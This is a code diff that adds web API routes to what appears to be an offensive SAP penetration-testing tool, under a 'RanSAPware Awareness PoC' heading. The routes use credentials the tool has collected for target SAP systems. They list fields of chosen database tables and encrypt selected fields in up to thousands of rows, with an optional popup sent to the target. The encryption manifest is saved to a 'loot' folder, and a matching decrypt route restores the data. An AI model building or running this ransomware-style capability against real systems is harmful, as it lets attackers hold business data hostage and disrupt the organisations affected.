@@ -14685,6 +14685,137 @@ def create_app(api: SAPMAPApi) -> Bottle:
         import sapmap_impact
         return json.dumps(sapmap_impact.list_scenarios())
 
+    # -- RanSAPware Awareness PoC --
+
+    @app.route("/api/ransapware/suggested_tables")
+    def ransapware_suggested_tables():
+        response.content_type = "application/json"
+        import sap_ransapware
+        return json.dumps(sap_ransapware.SUGGESTED_TABLES)
+
+    @app.route("/api/node/<sid>/ransapware/fields", method="POST")
+    def ransapware_fields(sid):
+        response.content_type = "application/json"
+        import sap_ransapware
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        creds = node.best_credentials()
+        if not creds:
+            return json.dumps({"error": f"No credentials for {sid}"})
+        data = request.json or {}
+        table_name = (data.get("table") or "").strip().upper()
+        if not table_name:
+            return json.dumps({"error": "No table specified"})
+        fields = sap_ransapware.get_field_metadata(
+            node, creds, table_name)
+        if not fields:
+            return json.dumps({"error":
+                f"Could not read metadata for {table_name}"})
+        return json.dumps({
+            "table": table_name,
+            "fields": [
+                {"name": f.name, "datatype": f.datatype,
+                 "length": f.length, "is_key": f.is_key,
+                 "eligible": f.eligible,
+                 "description": f.description}
+                for f in fields
+            ],
+        })
+
+    @app.route("/api/node/<sid>/ransapware/encrypt", method="POST")
+    def ransapware_encrypt(sid):
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        creds = node.best_credentials()
+        if not creds:
+            return json.dumps({"error": f"No credentials for {sid}"})
+        data = request.json or {}
+        table_name = (data.get("table") or "").strip().upper()
+        target_fields = data.get("fields", [])
+        key_fields = data.get("key_fields", [])
+        max_rows = int(data.get("max_rows", 5000))
+        send_popup = data.get("send_popup", True)
+        if not table_name or not target_fields or not key_fields:
+            return json.dumps({"error": "Missing table/fields/key_fields"})
+
+        def _run():
+            import sap_ransapware
+            import sapmap_state as _ss
+            soap_session, _ = resolve_soap_session_for_node(
+                api.state, node, timeout=180.0)
+            try:
+                manifest = sap_ransapware.encrypt_table(
+                    node, creds, table_name, target_fields,
+                    key_fields, max_rows=max_rows,
+                    send_popup=send_popup,
+                    soap_session=soap_session)
+                loot_dir = _ss.ensure_loot_dir("ransapware")
+                path = sap_ransapware.save_manifest(manifest, loot_dir)
+                print(f"[+] RanSAPware {sid}: manifest saved to {path}")
+                if manifest.rows_encrypted > 0:
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"RanSAPware PoC — {manifest.rows_encrypted} "
+                        f"rows encrypted in {table_name} "
+                        f"({', '.join(target_fields)})",
+                        attack_capability="ransapware.encrypt",
+                    )
+            except Exception as e:
+                import traceback
+                print(f"[-] RanSAPware {sid}: {e}")
+                traceback.print_exc()
+
+        _bg(f"{sid}:ransapware_encrypt", "RanSAPware Encrypt", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/ransapware/decrypt", method="POST")
+    def ransapware_decrypt(sid):
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        creds = node.best_credentials()
+        if not creds:
+            return json.dumps({"error": f"No credentials for {sid}"})
+        data = request.json or {}
+        manifest_path = data.get("manifest_path", "")
+        if not manifest_path:
+            return json.dumps({"error": "No manifest_path specified"})
+
+        def _run():
+            import sap_ransapware
+            try:
+                manifest = sap_ransapware.load_manifest(manifest_path)
+                soap_session, _ = resolve_soap_session_for_node(
+                    api.state, node, timeout=180.0)
+                result = sap_ransapware.decrypt_table(
+                    node, creds, manifest,
+                    soap_session=soap_session)
+                if result.get("success"):
+                    sap_ransapware.save_manifest(
+                        manifest,
+                        os.path.dirname(os.path.dirname(manifest_path)))
+                    print(f"[+] RanSAPware {sid}: decryption complete, "
+                          f"manifest updated")
+            except Exception as e:
+                import traceback
+                print(f"[-] RanSAPware {sid}: {e}")
+                traceback.print_exc()
+
+        _bg(f"{sid}:ransapware_decrypt", "RanSAPware Decrypt", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/ransapware/manifests")
+    def ransapware_manifests(sid):
+        response.content_type = "application/json"
+        import sap_ransapware
+        import sapmap_state as _ss
+        loot_dir = _ss.ensure_loot_dir("ransapware")
+        return json.dumps(sap_ransapware.find_manifests(loot_dir, sid))
+
     # -- Export --
     @app.route("/api/export/json")
     def export_json():
